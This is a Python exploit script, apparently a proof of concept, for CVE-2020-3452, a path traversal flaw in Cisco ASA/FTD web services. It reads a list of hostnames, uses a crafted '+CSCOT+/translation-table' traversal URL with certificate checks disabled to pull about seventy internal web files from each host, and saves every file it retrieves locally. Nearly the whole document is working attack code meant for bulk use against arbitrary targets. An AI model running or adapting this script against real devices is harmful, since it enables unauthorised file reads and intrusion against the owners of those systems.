#!/usr/bin/env python3
"""
CVE-2020-3452
POC#1 https://{netloc}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/{file}&default-language&lang=../
POC#2 https://{netloc}/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/{netloc}
"""

__author__ = "grim3"
__version__ = "0.0.1"
__license__ = "gpl-2.0"


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.compat import urljoin, quote_plus, urlparse
from urllib.parse import parse_qsl
from urllib.parse import urlunsplit, urlencode
import argparse,requests
from logzero import logger
from furl import furl
import os.path


FILES = ['logo.gif','http_auth.html','user_dialog.html','localization_inc.lua','portal_inc.lua','include','nostcaccess.html','ask.html','no_svc.html','svc.html','session.js','useralert.html','ping.html','help','app_index.html','tlbr','portal_forms.js','logon_forms.js','win.js','portal.css','portal.js','sess_update.html','blank.html','noportal.html','portal_ce.html','portal.html','home','logon_custom.css','portal_custom.css','preview.html','session_expired','custom','portal_elements.html','commonspawn.js','common.js','appstart.js','appstatus','relaymonjar.html','relaymonocx.html','relayjar.html','relayocx.html','portal_img','color_picker.js','color_picker.html','cedhelp.html','cedmain.html','cedlogon.html','cedportal.html','cedsave.html','cedf.html','ced.html','lced.html','files','041235123432C2','041235123432U2','pluginlib.js','shshim','do_url','clear_cache','connection_failed_form','apcf','ucte_forbidden_data','ucte_forbidden_url','cookie','session_password.html','tunnel_linux.jnlp','tunnel_mac.jnlp','sdesktop','gp-gip.html','auth.html','wrong_url.html','logon_redirect.html','logout.html','logon.html','test_chargen','posturl.html']

def scan(host):
    netloc = host.strip('\n')
    
    
    path = os.getcwd()
    new_dir = os.path.join(path, netloc)
    os.mkdir(new_dir)
    
    for file_name in FILES:
        f = furl(f"https://{netloc}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/{file_name}&default-language&lang=../")  
        url = f.tostr(query_dont_quote='/')
        logger.info(url)

        request = requests.get(url, verify=False)

        if request.status_code == 200:
            
            path_and_file = os.path.join(new_dir ,file_name)
            file = open(path_and_file, "w")
            file.write(request.text)
            file.close

            logger.error(f"Vulnerable: {file_name} acquired")
        
        else:
            logger.warning("File not found")

    return 
    

def main(args):
    
    logger.info("CVE-2020-3452 Scanner")
    logger.info(args)

    if args.input is not None:
            
        with open(args.input) as items:
            print("[+] ...")
            for host in items:    
                # Create pre-flight and scan only active targets
                try: scan(host)
                except Exception:
                    pass

    
if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--input", action="store", dest="input",required=True, help='The file containing a list of hostnames or IP addresses') 
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Verbosity (-v, -vv, etc)")

    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s (version {version})".format(version=__version__))

    args = parser.parse_args()
    main(args)
